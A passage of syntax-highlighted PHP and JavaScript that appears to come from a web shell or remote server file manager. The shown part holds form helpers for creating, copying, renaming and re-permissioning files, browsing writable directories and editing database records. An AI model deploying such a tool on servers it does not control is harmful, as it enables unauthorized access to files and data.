bold;\">length<\/span>;<span style=\"color: #f2777a; font-weight: bold;\">i<\/span>++) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">e<\/span> = <span style=\"color: #f2777a; font-weight: bold;\">form<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">elements[<\/span><span style=\"color: #f2777a; font-weight: bold;\">i<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">e<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">name<\/span> != <span style=\"color: #66cccc;\">'chkall'<\/span>)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">e<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">checked<\/span> = <span style=\"color: #f2777a; font-weight: bold;\">form<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">chkall<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">checked<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">$<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">id<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #f2777a; font-weight: bold;\">document<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">getElementById(<\/span><span style=\"color: #f2777a; font-weight: bold;\">id<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">createdir<\/span>(){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">newdirname<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">newdirname<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">prompt(<\/span><span style=\"color: #66cccc;\">'Please input the directory name:'<\/span>, <span style=\"color: #66cccc;\">''<\/span>  );\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #f2777a; font-weight: bold;\">newdirname<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'createdir'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">newdirname<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">newdirname<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'createdir'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">fileperm<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">pfile<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">newperm<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">newperm<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">prompt(<\/span><span style=\"color: #66cccc;\">'Current file:'<\/span>+<span style=\"color: #f2777a; font-weight: bold;\">pfile<\/span>+<span style=\"color: #66cccc;\">'\\nPlease input new attribute:'<\/span>, <span style=\"color: #66cccc;\">''<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #f2777a; font-weight: bold;\">newperm<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileperm'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">newperm<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">newperm<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileperm'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">pfile<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">pfile<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileperm'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">copyfile<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">sname<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">tofile<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">tofile<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">prompt(<\/span><span style=\"color: #66cccc;\">'Original file:'<\/span>+<span style=\"color: #f2777a; font-weight: bold;\">sname<\/span>+<span style=\"color: #66cccc;\">'\\nPlease input object file (fullpath<\/span><span style=\"color: #66cccc; text-decoration: underline;\">):'<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #f2777a; font-weight: bold;\">tofile<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'copyfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">tofile<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">tofile<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'copyfile'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">sname<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">sname<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'copyfile'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">rename<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">oldname<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">newfilename<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">newfilename<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">prompt(<\/span><span style=\"color: #66cccc;\">'Former file name:'<\/span>+<span style=\"color: #f2777a; font-weight: bold;\">oldname<\/span>+<span style=\"color: #66cccc;\">'\\nPlease input new filenam<\/span><span style=\"color: #66cccc; text-decoration: underline;\">e:'<\/span><span style=\"text-decoration: underline;\">, <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #f2777a; font-weight: bold;\">newfilename<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'rename'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">newfilename<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">newfilename<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'rename'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">oldname<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">oldname<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'rename'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">dofile<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">thefile<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">m<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">m<\/span> &amp;&amp; !<span style=\"color: #cccccc; background-color: #2d2d2d;\">confirm(<\/span><span style=\"color: #f2777a; font-weight: bold;\">m<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'filelist'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">thefile<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'filelist'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">thefile<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">thefile<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'filelist'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">createfile<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #f2777a; font-weight: bold;\">filename<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #f2777a; font-weight: bold;\">filename<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">prompt(<\/span><span style=\"color: #66cccc;\">'Please input the file name:'<\/span>, <span style=\"color: #66cccc;\">''<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #f2777a; font-weight: bold;\">filename<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">opfile(<\/span><span style=\"color: #66cccc;\">'editfile'<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span> + <span style=\"color: #f2777a; font-weight: bold;\">filename<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">opfile<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">opfile<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileopform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileopform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">opfile<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">opfile<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileopform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'fileopform'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">godir<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">view_writable<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">view_writable<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'godir'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">view_writable<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">view_writable<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'godir'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'godir'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">getsize<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">getdir<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'getsize'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">getdir<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">getdir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'getsize'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">dir<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'getsize'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">editrecord<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">base64<\/span>, <span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">action<\/span> == <span style=\"color: #66cccc;\">'del'<\/span>) {<span style=\"color: #f2777a; background-color: #515151;\">      <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!<span style=\"color: #cccccc; background-color: #2d2d2d;\">confirm(<\/span><span style=\"color: #66cccc;\">'Is or isn\\'t deletion record?'<\/span>)) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'recordlist'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'recordlist'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">base64<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">base64<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'recordlist'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'recordlist'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">moddbname<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">dbname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #f2777a; font-weight: bold;\">dbname<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'setdbname'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">dbname<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">dbname<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'setdbname'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">settable<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">page<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'settable'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">doing<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #f2777a; font-weight: bold;\">page<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'settable'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">page<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">page<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'settable'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">tablename<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'settable'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">s<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p1<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p2<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p3<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p5<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">p1<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">p1<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">p1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">p2<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">p2<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">p2<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">p3<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">p3<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">p3<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">p5<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>.<span style=\"color: #f2777a; font-weight: bold;\">value<\/span>=<span style=\"color: #f2777a; font-weight: bold;\">p5<\/span>;\n}\n<span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">g<\/span>(<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p1<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p2<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p3<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p5<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #f2777a; font-weight: bold;\">action<\/span>) <span style=\"color: #99cc99;\">return<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">s(<\/span><span style=\"color: #f2777a; font-weight: bold;\">action<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">nowpath<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p1<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p2<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p3<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p4<\/span>,<span style=\"color: #f2777a; font-weight: bold;\">p5<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$(<\/span><span style=\"color: #66cccc;\">'opform'<\/span>).<span style=\"color: #cccccc; background-color: #2d2d2d;\">submit(<\/span>);\n}\n<span style=\"color: #6699cc;\">&lt;\/script&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;\/head&gt;<\/span>\n<span style=\"color: #6699cc;\">&lt;body<\/span> <span style=\"color: #6699cc;\">style=<\/span><span style=\"color: #66cccc;\">\"margin:0;table-layout:fixed; word-break:break-all\"<\/span><span style=\"color: #6699cc;\">&gt;<\/span>\n<span style=\"color: #cc99cc;\">&lt;?php<\/span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=<span style=\"color: #6699cc;\">&gt;<\/span><span style=\"color: #66cccc;\">'opform'<\/span>));\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>, $<span style=\"color: #ffcc66;\">action<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'nowpath'<\/span>, $<span style=\"color: #ffcc66;\">nowpath<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'p1'<\/span>, $<span style=\"color: #ffcc66;\">p1<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'p2'<\/span>, $<span style=\"color: #ffcc66;\">p2<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'p3'<\/span>, $<span style=\"color: #ffcc66;\">p3<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'p4'<\/span>, $<span style=\"color: #ffcc66;\">p4<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'p5'<\/span>, $<span style=\"color: #ffcc66;\">p5<\/span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"color: #99cc99;\">if<\/span>(!<span style=\"color: #cccccc; 